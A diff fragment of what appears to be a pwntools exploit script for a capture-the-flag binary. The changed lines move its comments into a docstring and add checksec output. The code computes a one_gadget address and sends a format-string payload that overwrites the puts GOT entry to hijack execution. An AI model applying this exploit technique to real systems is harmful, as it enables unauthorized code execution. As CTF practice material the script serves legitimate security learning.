@@ -52,10 +52,20 @@ one_gadget ./glibc/libc.so.6
 '''
 one_gadget = libc_base + 0xebcf1
 
-#use fmtstr_payload to overwrite puts in got, as puts will be called after we feed our payload to the binary
-#fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
-#offset: the first formatter's offset you control
-#from detect(): first 2e786c252e786c25 (%p.%p...) -> 8
+'''
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  './glibc/'
+
+No RELRO, so we can overwrite got, otherwise need to think about other solustions... e.g. the Format challenge.
+use fmtstr_payload to overwrite puts in got, as puts will be called after we feed our payload to the binary
+fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
+offset: the first formatter's offset you control
+from detect(): first 2e786c252e786c25 (%p.%p...) -> 8
+'''
 
 payload = fmtstr_payload(8, {elf_base + elf.got.puts : one_gadget})
 io.sendlineafter('Anyway, here comes another bunch of kids, let\'s try one more time..\n\n\n', payload)
